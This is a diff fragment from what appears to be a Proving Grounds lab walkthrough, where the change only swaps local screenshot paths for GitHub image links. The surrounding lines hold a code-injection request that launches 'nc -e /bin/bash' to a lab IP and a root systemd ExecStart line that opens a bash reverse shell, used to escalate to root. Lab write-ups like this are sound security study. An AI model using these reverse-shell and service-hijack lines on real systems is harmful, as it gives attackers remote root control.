@@ -399,13 +399,13 @@ curl -X POST --data "code=os.system('nc -e /bin/bash 192.168.45.161 18000')" htt
 ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.161/50000 0>&1'
 User=root
   
-/home/parallels/Documents/Offensive-Security-Proving-Grounds-Boxes-Sync/Pasted Images/Pasted image 20240418181341.png
+![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/82690842-b52c-43af-b2a9-24c8286f6273)
 
 - We type "sudo /sbin/reboot" to reboot the system since "services" need to be restarted in order for any modifications we made to the service app to take effect.
 
 - Next, we obtain a root shell after setting up a listener on port 50000.
 
-/home/parallels/Documents/Offensive-Security-Proving-Grounds-Boxes-Sync/Pasted Images/Pasted image 20240418182524.png
+![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/255a306f-1c48-403d-ac8c-f1c9bcd26f50)
 
 ---
 
